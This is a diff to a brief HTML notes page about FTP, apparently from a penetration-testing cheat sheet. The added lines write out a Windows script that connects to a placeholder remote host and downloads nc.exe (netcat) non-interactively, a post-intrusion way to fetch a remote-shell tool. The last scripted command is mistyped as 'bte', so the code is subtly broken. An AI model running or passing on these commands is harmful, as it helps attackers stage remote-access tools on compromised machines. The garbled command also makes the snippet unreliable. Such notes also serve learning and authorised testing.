@@ -3,4 +3,16 @@
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <title>FTP</title>
-</head><body>If you have access to a ftp-client you can of course just use that. Remember, if you are uploading binaries you must use binary mode, otherwise the binary will become corrupted!!!</body></html>
+</head><body>If you have access to a ftp-client you can of course just use that. Remember, if you are uploading binaries you must use binary mode, otherwise the binary will become corrupted!!!<br/>
+<br/>
+<br/>
+Issuing commands from an ftp.txt<br/>
+echo open &lt;RHOST&gt; 21 &gt; ftp.txt<br/>
+echo USER &lt;USER&gt; &gt;&gt; ftp.txt<br/>
+echo ftp &gt;&gt; ftp.txt<br/>
+echo bin &gt;&gt; ftp.txt<br/>
+echo GET nc.exe &gt;&gt; ftp.txt<br/>
+echo bte &gt;&gt; ftp.txt<br/>
+<br/>
+Initiate the connection and run all commands in file:<br/>
+ftp -v -n -s:ftp.txt</body></html>
